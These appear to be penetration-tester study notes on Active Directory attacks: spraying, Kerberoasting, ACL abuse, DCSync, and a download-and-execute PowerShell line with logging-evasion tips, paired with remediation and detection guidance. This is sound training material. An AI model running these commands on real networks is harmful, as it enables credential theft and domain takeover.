# ACTIVE DIRECTORY ENUMERATION & ATTACKS

## INTRO TO AD ENUMERATION & ATTACKS

Directory service for Windows enterprise environments, x.500/LDAP-based, centralized management of users/computers/groups/shares/GPOs/trusts. Core loop of an AD-focused test: foothold → escalate privilege → move laterally/vertically → domain compromise or whatever specific goal the engagement defines (a host, a mailbox, a database, full DA).

Need fluency in both Windows and Linux tooling, plus living-off-the-land using only native commands — clients sometimes restrict you to a managed workstation with no internet access or tool-pulling ability, or want to see what's possible with zero custom tooling at all.

Toolkit locations on provided attack hosts: Windows — `C:\Tools`, AD PowerShell module loads on PowerShell console open. Linux — installed + in PATH, or `/opt`.

## TOOLS OF THE TRADE

```
PowerView / SharpView      situational awareness, replacement for net* commands, harder to correlate than BloodHound but great for quick wins
BloodHound                 visual AD relationship/attack-path mapper (Neo4j + Electron GUI)
SharpHound                 C# BloodHound data collector → JSON
BloodHound.py               Python/Impacket-based collector, works from non-domain-joined host
Kerbrute                    Go tool — Kerberos pre-auth username enum + password spray/brute force
Impacket                    Python toolkit for AD/network protocol attacks
Responder                   LLMNR/NBT-NS/MDNS poisoner
Inveigh.ps1 / InveighZero    PowerShell / C# poisoning + spoofing, InveighZero has semi-interactive console
rpcinfo                     query/enumerate RPC services on a host (-p flag)
rpcclient                   Samba-suite AD enumeration via RPC
CrackMapExec (NetExec)      enum + attack + post-ex toolkit, lives off SMB/WMI/WinRM/MSSQL
Rubeus                      C# Kerberos abuse toolkit
GetUserSPNs.py              Impacket — find/roast SPN accounts
Hashcat                     hash cracking
enum4linux / enum4linux-ng   Windows/Samba enumeration (ng = Python rewrite, JSON/YAML output)
ldapsearch                  built-in LDAP interface
windapsearch                Python LDAP query tool for users/groups/computers
DomainPasswordSpray.ps1      PowerShell password spray, policy-aware
LAPSToolkit                 PowerView-based LAPS audit functions
smbmap                      SMB share enum across a domain
psexec.py                   Impacket — SYSTEM shell via ADMIN$ service
wmiexec.py                  Impacket — command exec over WMI
Snaffler                    credential/file hunting across accessible shares
smbserver.py                 quick SMB server, file transfer
setspn.exe                  add/read/modify/delete SPNs
Mimikatz                    pass-the-hash, plaintext extraction, Kerberos ticket ops
secretsdump.py               remote SAM/LSA/NTDS secrets dump
evil-winrm                   interactive WinRM shell (https://github.com/Hackplayers/evil-winrm)
mssqlclient.py               Impacket — MSSQL interaction
noPac.py                     CVE-2021-42278 + CVE-2021-42287 combo, standard user → DA
rpcdump.py                   Impacket — RPC endpoint mapper
CVE-2021-1675.py             PrintNightmare PoC
ntlmrelayx.py                 Impacket — SMB/HTTP relay
PetitPotam.py                CVE-2021-36942 PoC — coerce auth via MS-EFSRPC
gettgtpkinit.py / getnthash.py  cert/TGT manipulation (PKINITtools)
adidnsdump                   dump AD-integrated DNS zone (https://github.com/dirkjanm/adidnsdump)
gpp-decrypt                  decrypt GPP cpassword
GetNPUsers.py                Impacket — ASREPRoast
lookupsid.py                 SID brute-forcer
ticketer.py                  forge/customize TGT/TGS (Golden Ticket, trust attacks)
raiseChild.py                 automated child→parent domain escalation
AD Explorer                  AD viewer/editor + offline snapshot/diff tool
PingCastle                   AD risk/maturity scoring (https://www.pingcastle.com)
Group3r                      GPO misconfig finder (https://github.com/Group3r/Group3r)
ADRecon                       broad AD data export tool (https://github.com/adrecon/ADRecon)
```

## EXTERNAL RECON AND ENUMERATION PRINCIPLES

Purpose: validate scoping-doc info, confirm scope boundaries, surface public leaks before internal testing starts.

```
IP Space          ASN, netblocks, cloud presence, hosting provider, DNS records
Domain Info       subdomains, exposed services (mail/DNS/web/VPN), visible defenses (SIEM/AV/IPS)
Schema Format      email/AD username convention, password policy hints
Data Disclosures   public PDFs/PPTs/DOCXs — intranet links, user metadata, share names
Breach Data        leaked creds usable for spray/credential stuffing
```

Sources:

```
ASN/IP registrars      IANA, ARIN, RIPE, BGP Toolkit (bgp.he.net)
Domain/DNS              Domaintools, PTRArchive, ICANN, viewdns.info, direct queries against 8.8.8.8
Social media            LinkedIn, Twitter, job postings — reveal tech stack/versions (e.g. "SharePoint 2013/2016" in a job ad = in-place-upgrade risk)
Company site            About/Contact pages, embedded docs
Cloud/dev storage       GitHub, S3/Azure Blob, Google dorks
Breach data             HaveIBeenPwned, Dehashed
```

Google dorks: `filetype:pdf inurl:<domain>`, `intext:"@<domain>" inurl:<domain>`.

```bash
nslookup ns1.<domain>
```

Username mashup from LinkedIn scrape — linkedin2username. Breach cred search:

```bash
sudo python3 dehashed.py -q <domain> -p
```

Always validate scope before touching any discovered IP not explicitly listed — third-party/shared infrastructure needs written client approval, escalate rather than assume.

## INITIAL ENUMERATION OF THE DOMAIN

Engagement setup variants worth knowing: grey box (IP ranges only) vs black box (blind discovery); evasive vs non-evasive vs hybrid; attack host as VM/physical device/managed workstation/VDI; with or without a starting domain user account.

Key data points: AD users, AD-joined computers (DCs, file/SQL/web/mail servers), key services (Kerberos, NetBIOS, LDAP, DNS), vulnerable hosts.

**Passive host ID**:

```bash
sudo -E wireshark          # ARP + MDNS reveal hostnames/IPs even on a switched network
sudo tcpdump -i <IFACE>
```

Windows built-in: `pktmon.exe` (Win10+).

**Active ID**:

```bash
fping -asgq <CIDR>          # -a alive only, -s stats, -g generate from CIDR, -q quiet
```

```bash
sudo nmap -v -A -iL hosts.txt -oA <OUTPUT_PREFIX>
```

DC signature ports: 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 3389. `rdp-ntlm-info` NSE output reveals NetBIOS/DNS names even unauthenticated. Always use `-oA` for multi-format output usable by downstream tools.

**Username enumeration — Kerbrute** (https://github.com/ropnop/kerbrute.git):

```bash
git clone https://github.com/ropnop/kerbrute.git
make all                     # or: make linux / windows / mac
kerbrute userenum -d <DOMAIN> --dc <DC_IP> <WORDLIST> -o valid_ad_users
```

Wordlists: jsmith.txt/jsmith2.txt from the statistically-likely-usernames repo.

SYSTEM on a domain-joined host ≈ domain user for enumeration purposes (impersonates the computer account). Paths to SYSTEM: remote exploits (EternalBlue/MS08-067/BlueKeep), SeImpersonate abuse (JuicyPotato — less reliable on 2019+), local privesc 0-days, PsExec after local-admin compromise.

## LLMNR/NBT-NS POISONING — FROM LINUX

LLMNR (UDP 5355) and NBT-NS (UDP 137) are DNS-failure fallbacks — **any host on the segment can answer**. Attack flow: mistyped/unresolvable hostname → broadcast → attacker claims to be that host → victim sends NTLMv2 auth → capture hash → crack offline or relay.

Protocols covered by both Responder and Inveigh: LLMNR, DNS, MDNS, NBNS, DHCP, ICMP, HTTP, HTTPS, SMB, LDAP, WebDAV, Proxy Auth. Responder-only extras: MSSQL, DCE-RPC, FTP/POP3/IMAP/SMTP auth.

```bash
responder -h
```

```
-A    analyze mode (passive, no poisoning)
-f    fingerprint OS of the requesting host
-w    WPAD rogue proxy — captures IE/auto-detect HTTP traffic broadly
-v    verbose
--lm  force LM hash downgrade (XP/2003 era)
```

Required ports: UDP 137/138/53/389/1434/5355/5353, TCP 389/1433/80/135/139/445/21/3141/25/110/587/3128. Individual rogue servers (SMB etc.) disable-able in `Responder.conf`.

```bash
sudo responder -I <IFACE>
```

Logs: `/usr/share/responder/logs/`, format `<MODULE>-<HASHTYPE>-<CLIENT_IP>.txt`. Run in tmux, let it sit while doing other enumeration.

```bash
hashcat -m 5600 <HASH_FILE> /usr/share/wordlists/rockyou.txt
```

## LLMNR/NBT-NS POISONING — FROM WINDOWS

Inveigh — PowerShell (legacy) or C# (InveighZero, actively maintained).

```powershell
Import-Module .\Inveigh.ps1
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

InveighZero:

```powershell
.\Inveigh.exe
```

`ESC` → interactive console:

```
GET NTLMV2UNIQUE           unique hashes only
GET NTLMV2USERNAMES        usernames + source IPs
GET CLEARTEXT              cleartext creds captured
STOP                        stop capture
```

**Remediation**: disable LLMNR via GPO (Computer Config > Admin Templates > Network > DNS Client > "Turn OFF Multicast Name Resolution"). NBT-NS can't be disabled via GPO directly — push a startup script instead:

```powershell
$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
Get-ChildItem $regkey | foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}
```

Host on SYSVOL (`\\<domain>\SYSVOL\<DOMAIN>\scripts`), link via GPO Computer Config > Windows Settings > Scripts (Startup). Also: SMB signing (kills relay specifically), network segmentation, filter LLMNR/NBT-NS traffic at the network layer.

**Detection**: inject LLMNR/NBT-NS requests for non-existent hosts across subnets and alert on any answer (indicates a poisoner). Monitor UDP 5355/137, event IDs 4697 (service install) and 7045 (new service), registry `HKLM\Software\Policies\Microsoft\Windows NT\DNSClient\EnableMulticast` (0 = disabled).

## PASSWORD SPRAYING OVERVIEW

Few common passwords across many usernames — opposite risk profile from brute force (fewer attempts/user = lower lockout risk, but not zero). Always need the password policy first to know safe round size and delay. Common policy: 5 bad attempts / 30 min lockout window, but varies — some orgs use 3 attempts with mandatory admin unlock.

## ENUMERATING & RETRIEVING PASSWORD POLICIES

**Credentialed (Linux)**:

```bash
crackmapexec smb <DC_IP> -u <USER> -p <PASS> --pass-pol
```

**Uncredentialed — SMB NULL session**:

```bash
rpcclient -U "" -N <DC_IP>
rpcclient $> querydominfo
rpcclient $> getdompwinfo
```

```bash
enum4linux -P <DC_IP>
enum4linux-ng -P <DC_IP> -oA <OUTPUT>
```

**LDAP anonymous bind**:

```bash
ldapsearch -h <DC_IP> -x -b "DC=<DOMAIN>,DC=<TLD>" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

(`-h` deprecated for `-H` in newer versions).

**From Windows, uncredentialed**:

```cmd
net use \\<DC>\ipc$ "" /u:""
```

Error codes worth recognizing: 1331 = account disabled, 1326 = wrong password, 1909 = account locked out.

**From Windows, credentialed**:

```cmd
net accounts
```

```powershell
Import-Module .\PowerView.ps1
Get-DomainPolicy
```

Key fields: min password length, lockout threshold, lockout duration, complexity flag, reset-counter window. **Default (never-changed) policy**: history 24, max age 42d, min age 1d, min length 7, complexity enabled, reversible encryption disabled, lockout duration/threshold/reset counter all unset — plenty of orgs still run this. Safe spray math: `lockoutThreshold - 2` attempts per round, wait `lockoutDuration + 5min` between rounds, never exceed threshold-1 total.

## PASSWORD SPRAYING — MAKING A TARGET USER LIST

Always log: accounts targeted, DC used, timestamp, password(s) attempted — needed to cross-check against client logging if lockouts/alerts occur.

```bash
enum4linux -U <DC_IP> | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

```bash
rpcclient -U "" -N <DC_IP>
rpcclient $> enumdomusers
```

```bash
crackmapexec smb <DC_IP> --users                              # unauthenticated
crackmapexec smb <DC_IP> -u <USER> -p <PASS> --users           # credentialed — shows badpwdcount/baddpwdtime, filter near-lockout accounts out
```

```bash
ldapsearch -h <DC_IP> -x -b "DC=<DOMAIN>,DC=<TLD>" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
./windapsearch.py --dc-ip <DC_IP> -u "" -U
```

Kerbrute for enum (no auth) — doesn't trigger event 4625 (logon failure), but does trigger 4768 (TGT requested) if Kerberos auditing is enabled — worth knowing for stealth planning either way.

## INTERNAL PASSWORD SPRAYING — FROM LINUX

```bash
for u in $(cat valid_users.txt); do rpcclient -U "$u%<PASSWORD>" -c "getusername;quit" <DC_IP> | grep Authority; done
```

```bash
kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> valid_users.txt <PASSWORD>
```

```bash
sudo crackmapexec smb <DC_IP> -u valid_users.txt -p <PASSWORD> | grep +
```

Validate a hit:

```bash
sudo crackmapexec smb <DC_IP> -u <USER> -p <PASSWORD>
```

**Local admin password reuse**: gold-image deployments often share the same local admin password across many hosts.

```bash
sudo crackmapexec smb --local-auth <CIDR> -u administrator -H <NTLM_HASH> | grep +
```

`--local-auth` is critical — caps it to one login attempt per host, no domain lockout risk. Worth testing pattern variants too — `$desktop%@admin123` on desktops → try `$server%@admin123` on servers; non-standard local admin names (`bsmith`) → try same password on the similarly-named domain account (`bsmith`); same logic across domain trusts. Mitigation: LAPS for unique rotating local admin passwords.

## INTERNAL PASSWORD SPRAYING — FROM WINDOWS

DomainPasswordSpray.ps1 — domain-joined + authenticated: auto-generates the full user list from AD, reads the real password policy, excludes accounts within 1 attempt of lockout automatically.

```powershell
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password <PASSWORD> -OutFile spray_success -ErrorAction SilentlyContinue
```

**Mitigations**: MFA (note: some implementations still leak whether a specific username/password combo is valid even on 2FA failure — treat as a partial mitigation only), least-privilege app access, separate admin accounts, network segmentation, password hygiene + dictionary filter.

**Detection**: event 4625 (SMB-based spray), 4771 (Kerberos preauth failed — signals LDAP-based spray, needs Kerberos logging enabled to see).

**External spray targets**: O365, OWA/EWS, Skype for Business, Lync, RDS portals, Citrix, VDI (VMware Horizon), VPN portals (Citrix/SonicWall/OpenVPN/Fortinet), any custom AD-auth web app.

## ENUMERATING SECURITY CONTROLS

```powershell
Get-MpComputerStatus | select RealTimeProtectionEnabled,AMServiceEnabled,AntispywareEnabled
```

```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

Orgs commonly block only `%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe` and forget the SysWOW64 copy or `PowerShell_ISE.exe` — check the exact `PathConditions` before assuming PowerShell is actually blocked.

```powershell
$ExecutionContext.SessionState.LanguageMode
```

`ConstrainedLanguage` = locked down (no COM objects, only approved .NET types); `FullLanguage` = unrestricted.

**LAPS enumeration**:

```powershell
Find-LAPSDelegatedGroups           # groups w/ LAPS read rights per OU
Find-AdmPwdExtendedRights          # AllExtendedRights holders — often less protected than delegated groups
Get-LAPSComputers                  # LAPS-enabled hosts + cleartext password if your account can read it
```

## CREDENTIALED ENUMERATION — FROM LINUX

CrackMapExec (now NetExec) — Impacket + PowerSploit under the hood.

```bash
crackmapexec {mssql,smb,ssh,winrm}
crackmapexec smb -h
```

```bash
crackmapexec smb <DC_IP> -u <USER> -p <PASS> --users        # badpwdcount field for spray-safety filtering
crackmapexec smb <DC_IP> -u <USER> -p <PASS> --groups
crackmapexec smb <TARGET_IP> -u <USER> -p <PASS> --loggedon-users   # (Pwn3d!) = local admin confirmed
crackmapexec smb <DC_IP> -u <USER> -p <PASS> --shares
crackmapexec smb <DC_IP> -u <USER> -p <PASS> -M spider_plus --share '<SHARE>'   # → /tmp/cme_spider_plus/<ip>.json
```

```bash
smbmap -u <USER> -p <PASS> -d <DOMAIN> -H <DC_IP>
smbmap -u <USER> -p <PASS> -d <DOMAIN> -H <DC_IP> -R '<SHARE>' --dir-only
```

```bash
rpcclient -U "" -N <DC_IP>
rpcclient $> enumdomusers
rpcclient $> queryuser <RID_HEX>
rpcclient $> querydominfo
rpcclient $> getdompwinfo
```

RID concept: domain SID + RID = full object SID; well-known RIDs are stable across domains (built-in Administrator = 0x1f4 = 500 decimal).

Impacket:

```bash
psexec.py <DOMAIN>/<USER>:'<PASS>'@<TARGET_IP>       # drops SYSTEM shell via ADMIN$ service upload — noisier
wmiexec.py <DOMAIN>/<USER>:'<PASS>'@<TARGET_IP>       # semi-interactive, runs as connecting user (not SYSTEM), fewer logs — but spawns a new cmd.exe per command → event 4688 tell
```

```bash
python3 windapsearch.py --dc-ip <DC_IP> -u <USER>@<DOMAIN> -p <PASS> --da    # domain admins
python3 windapsearch.py --dc-ip <DC_IP> -u <USER>@<DOMAIN> -p <PASS> -PU    # privileged users — recursive nested group membership, surfaces hidden escalation paths
```

BloodHound.py (https://github.com/Fox-IT/BloodHound.py):

```bash
sudo bloodhound-python -u '<USER>' -p '<PASS>' -ns <DC_IP> -d <DOMAIN> -c all
zip -r <NAME>.zip *.json
sudo neo4j start
bloodhound
```

## CREDENTIALED ENUMERATION — FROM WINDOWS

```powershell
Import-Module ActiveDirectory
Get-ADDomain                                                                  # domain SID, functional level, child domains
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName   # Kerberoast targets
Get-ADTrust -Filter *
Get-ADGroup -Filter * | select name
Get-ADGroup -Identity "<GROUP>"
Get-ADGroupMember -Identity "<GROUP>"
```

**PowerView** — key functions:

```
Get-DomainUser / Get-DomainComputer / Get-DomainGroup / Get-DomainOU
Find-InterestingDomainAcl                mod rights over non-built-in objects
Get-DomainGroupMember / Get-DomainFileServer / Get-DomainDFSShare
Get-DomainGPO / Get-DomainPolicy
Get-NetLocalGroup / Get-NetLocalGroupMember / Get-NetShare / Get-NetSession
Test-AdminAccess
Find-DomainUserLocation / Find-DomainShare / Find-InterestingDomainShareFile / Find-LocalAdminAccess
Get-DomainTrust / Get-ForestTrust / Get-DomainForeignUser / Get-DomainForeignGroupMember / Get-DomainTrustMapping
Export-PowerViewCSV / ConvertTo-SID / Get-DomainSPNTicket
```

```powershell
Get-DomainUser -Identity <USER> -Domain <DOMAIN> | Select-Object -Property name,samaccountname,memberof,pwdlastset,lastlogontimestamp,admincount,serviceprincipalname,useraccountcontrol
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
Get-DomainTrustMapping
Test-AdminAccess -ComputerName <HOST>
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```

SharpView (.NET port, same functions):

```powershell
.\SharpView.exe Get-DomainUser -Help
.\SharpView.exe Get-DomainUser -Identity <USER>
```

Snaffler:

```bash
Snaffler.exe -s -d <DOMAIN> -o snaffler.log -v data
```

`-s` console output, `-v data` filters to findings only. Color code: red = high priority (keys/certs/SQL dumps), black = medium.

SharpHound:

```powershell
.\SharpHound.exe -c All --zipfilename <NAME>
```

Upload zip to BloodHound GUI. Useful pre-built queries: Find Computers with Unsupported Operating Systems, Find Computers where Domain Users are Local Admin.

## LIVING OFF THE LAND

For zero-tool-access engagements or stealth requirements — native Windows commands only.

```
hostname
[System.Environment]::OSVersion.Version
wmic qfe get Caption,Description,HotFixID,InstalledOn
ipconfig /all
set                              (CMD)
echo %USERDOMAIN%                (CMD)
echo %logonserver%                (CMD)
systeminfo                       (all-in-one summary, fewer commands = fewer logs)
```

PowerShell:

```powershell
Get-Module
Get-ExecutionPolicy -List
Set-ExecutionPolicy Bypass -Scope Process     # reverts automatically on session exit — non-destructive
Get-ChildItem Env: | ft Key,Value
Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt   # may contain passwords
```

Download-and-run-from-memory: `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('<URL>');<FOLLOW_ON_COMMANDS>"`

PowerShell v2 downgrade evades Script Block Logging (PSv3+ only):

```powershell
powershell.exe -version 2
```

The downgrade command itself IS logged (Windows PowerShell log, event 400 shows `HostVersion 2.0`) — leaves evidence even though subsequent commands go dark.

Check who else is on the host before acting — avoid tipping someone off:

```powershell
qwinsta
```

Defenses check:

```cmd
netsh advfirewall show allprofiles
sc query windefend
```

```powershell
Get-MpComputerStatus
```

Network recon (also useful for black-box discovery beyond just AD):

```powershell
arp -a
route print
```

WMI:

```
wmic qfe get Caption,Description,HotFixID,InstalledOn
wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List
wmic process list /format:list
wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress
wmic useraccount list /format:list
wmic group list /format:list
wmic sysaccount list /format:list
```

Net commands:

```
net accounts /domain
net group /domain
net group "Domain Admins" /domain
net group "domain computers" /domain
net group <GROUP> /domain
net localgroup administrators /domain
net user <ACCOUNT> /domain
net user %username%
net use x: \\<COMPUTER>\<SHARE>
net view
net view /domain
```

OPSEC note: `net1` instead of `net` evades naive string-based command monitoring.

Dsquery:

```
dsquery user
dsquery computer
dsquery * "<DISTINGUISHED_NAME>"
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl   # PASSWD_NOTREQD (32)
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName   # find DCs
```

LDAP filter OID rules: `1.2.840.113556.1.4.803` = exact bit match, `.804` = any bit match, `.1941` = DN-chain match (ownership/membership). Logical operators: `&` and, `|` or, `!` not.

## KERBEROASTING — FROM LINUX

Any domain user can request a TGS for any SPN account — TGS is encrypted with that account's NTLM hash, crackable offline. Service accounts are frequently over-privileged (local admin across many hosts, sometimes nested into DA).

Works from: non-domain-joined Linux w/ creds, domain-joined Linux as root w/ keytab, domain-joined Windows authenticated, domain-joined Windows w/ any domain shell, SYSTEM on domain-joined Windows, non-domain-joined Windows via `runas /netonly`.

```bash
GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER>                              # list SPN accounts
GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER> -request                      # pull all TGS tickets
GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER> -request-user <TARGET> -outputfile <FILE>
```

```bash
hashcat -m 13100 <TGS_FILE> /usr/share/wordlists/rockyou.txt
```

Report framing: crack + privileged = high risk; crack + no gain = still note, lower priority; zero cracks even after sustained GPU effort = medium risk (flag the SPN exposure regardless).

## KERBEROASTING — FROM WINDOWS

**Semi-manual method** (useful when Rubeus isn't available):

```cmd
setspn.exe -Q */*
```

```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"
```

Bulk version (all SPNs at once, includes computer accounts as noise):

```powershell
setspn.exe -T <DOMAIN> -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

Mimikatz extraction:

```
mimikatz # base64 /out:true
mimikatz # kerberos::list /export
```

(skip `base64 /out:true` to write `.kirbi` files directly to disk instead). Prep for hashcat:

```bash
echo "<BASE64_BLOB>" | tr -d \\n
cat encoded_file | base64 -d > <NAME>.kirbi
python2.7 kirbi2john.py <NAME>.kirbi
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > <NAME>_hashcat
```

**Automated — PowerView**:

```powershell
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname
Get-DomainUser -Identity <USER> | Get-DomainSPNTicket -Format Hashcat
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\<FILE>.csv -NoTypeInformation
```

**Automated — Rubeus**:

```powershell
.\Rubeus.exe kerberoast /stats                              # enumerate only, no requests sent
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap   # target privileged accounts specifically
.\Rubeus.exe kerberoast /user:<USER> /nowrap
```

Encryption type matters a lot: RC4 (etype 23, `$krb5tgs$23$*`) → `hashcat -m 13100`, cracks fast. AES256 (etype 18, `$krb5tgs$18$*`) → `hashcat -m 19700`, ~100x slower.

```powershell
.\Rubeus.exe kerberoast /rc4opsec /nowrap        # tgtdeleg + filters out AES-enabled accounts automatically
.\Rubeus.exe kerberoast /user:<USER> /tgtdeleg /nowrap   # force RC4 downgrade even on AES-configured accounts
```

`/tgtdeleg` does **not** work against Windows Server 2019 DCs regardless of domain functional level — always returns the highest supported encryption there.

```powershell
Get-DomainUser <USER> -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```

`msDS-SupportedEncryptionTypes`: 0 = RC4 default, 24 = AES128/256 only.

Disable weaker Kerberos encryption types via GPO: Computer Config > Policies > Windows Settings > Security Settings > Local Policies > Security Options > "Network security: Configure encryption types allowed for Kerberos."

**Mitigation**: gMSA/MSA over standard service accounts (kills this attack outright via auto-rotating complex passwords); long passphrase if a standard account is unavoidable; never let a DA/privileged account also own an SPN.

**Detection**: event 4769 (TGS requested) + 4770 (renewed) via "Audit Kerberos Service Ticket Operations" GPO. Ticket encryption `0x17` hex = 23 decimal = RC4. Abnormal volume of 4769 for a single account in a short window = signal.

## ACL ABUSE PRIMER

DACL = allow/deny access; SACL = audit logging. ACL made up of ACEs (SID + allow/deny/audit type + inheritance flags + 32-bit access mask). Evaluated top-to-bottom, stops at first explicit deny.

**Key ACEs → abuse mechanism**:

```
ForceChangePassword              → Set-DomainUserPassword
GenericWrite (user)              → set a fake SPN, Kerberoast it
GenericWrite (group)             → Add-DomainGroupMember
GenericWrite (computer)          → Resource-Based Constrained Delegation
GenericAll                       → all of the above + Set-DomainObjectOwner; over a computer + LAPS present → read the LAPS password
AddSelf                          → Add-DomainGroupMember
WriteOwner                       → Set-DomainObjectOwner
WriteDACL                        → Add-DomainObjectACL
AllExtendedRights                → Set-DomainUserPassword or Add-DomainGroupMember
DS-Replication-Get-Changes + -All → DCSync
```

Common real-world patterns: abusing forgot-password delegation (Help Desk groups), abusing group-membership-management delegation, excessive leftover rights from software installs (Exchange is notorious) or legacy config. Not caught by vuln scanners — manual/BloodHound enumeration only, often goes unaudited for years.

## ACL ENUMERATION

`Find-InterestingDomainAcl` is a firehose, not practical to sift directly — target instead:

```powershell
$sid = Convert-NameToSid <USER>
Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}    # slow in large environments
```

`-ResolveGUIDs` turns raw `ObjectAceType` GUIDs into readable right names (e.g. `User-Force-Change-Password`); without it, reverse-lookup manually:

```powershell
$guid = "<GUID>"
Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * | Select Name,rightsGuid | ?{$_.rightsGuid -eq $guid}
```

```powershell
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```

No-PowerView fallback (built-in cmdlets only, much slower):

```powershell
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
foreach($line in [System.IO.File]::ReadLines("<PATH>\ad_users.txt")) {get-acl "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match '<DOMAIN>\\<USER>'}}
```

**Chain-following methodology**: SID of controlled user → ACL search → found right over object B → repeat with B's SID → check nested group membership (`Get-DomainGroup -Identity <GROUP> | select memberof`) since rights cascade through whatever a group is nested into. In BloodHound: set the starting node, Node Info → Outbound Control Rights → First Degree (direct) vs Transitive (full chain via ACL + nested groups); right-click an edge → Help for abuse tools/opsec notes/references.

## ACL ABUSE TACTICS

Full worked chain pattern — controlled user A has ForceChangePassword over B; B has GenericWrite over a group; that group nests into another group with GenericAll over target C; C has DCSync rights.

```powershell
$SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USER_A>', $SecPassword)

$targetPassword = ConvertTo-SecureString '<NEW_PASSWORD>' -AsPlainText -Force
Set-DomainUserPassword -Identity <USER_B> -AccountPassword $targetPassword -Credential $Cred -Verbose

$Cred2 = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USER_B>', $targetPassword)
Add-DomainGroupMember -Identity '<GROUP>' -Members '<USER_B>' -Credential $Cred2 -Verbose
```

Check nested membership cascades: `Get-DomainGroup -Identity <GROUP> | select memberof`.

Where GenericAll lands over the final target and the account can't be disturbed with a password change (e.g. an active admin account), abuse it via a fake SPN instead:

```powershell
Set-DomainObject -Credential $Cred2 -Identity <TARGET_C> -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
.\Rubeus.exe kerberoast /user:<TARGET_C> /nowrap
```

Linux equivalents: pth-net (pth-toolkit, https://github.com/byt3bl33d3r/pth-toolkit) for password/group changes; targetedKerberoast (https://github.com/ShutdownRepo/targetedKerberoast) automates the fake-SPN-plant-roast-cleanup cycle in one command.

**Cleanup — order matters** (removing group membership first loses the rights needed to clean the SPN):

```powershell
Set-DomainObject -Credential $Cred2 -Identity <TARGET_C> -Clear serviceprincipalname -Verbose
Remove-DomainGroupMember -Identity '<GROUP>' -Members '<USER_B>' -Credential $Cred2 -Verbose
```

Document every change for the final report even after cleanup.

**Detection**: Advanced Security Audit Policy → event ID 5136 (directory service object modified). SDDL in the raw event is unreadable — decode:

```powershell
ConvertFrom-SddlString "<SDDL_STRING>"
```

Filter `.DiscretionaryAcl` to see exactly what right got granted to whom.

## DCSYNC

Abuses the legit Directory Replication Service Remote Protocol (DC-to-DC replication) to impersonate a DC and pull the password database. Requires `DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All` on the domain object — default holders: Domain/Enterprise Admins, DCs — but standalone accounts sometimes get this granted by mistake.

```powershell
$sid = "<SID>"
Get-ObjectAcl "DC=<domain>,DC=<tld>" -ResolveGUIDs | ? {($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid}
```

```bash
secretsdump.py -outputfile <PREFIX> -just-dc <DOMAIN>/<USER>@<DC_IP>
```

Flags: `-just-dc-ntlm` (NTLM only), `-just-dc-user <USER>` (single account), `-pwd-last-set`, `-history`, `-user-status` (enabled/disabled — filter these out for accurate password-strength stats in reports). Output: `.ntds` (hashes), `.ntds.kerberos` (Kerberos keys), `.ntds.cleartext` (accounts with reversible encryption — genuine plaintext).

Reversible encryption check:

```powershell
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
```

Mimikatz — must run in the DCSync-rights account's session context:

```cmd
runas /netonly /user:<DOMAIN>\<USER> powershell
```

```
mimikatz # privilege::debug
mimikatz # lsadump::dcsync /domain:<DOMAIN> /user:<DOMAIN>\<TARGET>
```

WriteDacl escalation path: if you lack DCSync directly but have WriteDacl over the domain object, self-grant the two replication rights, DCSync, then remove them (flag the self-persistence risk in the report too).

## PRIVILEGED ACCESS

Beyond direct local-admin pass-the-hash: RDP, WinRM/PSRemoting, MSSQL sysadmin. BloodHound edges: `CanRDP`, `CanPSRemote`, `SQLAdmin`.

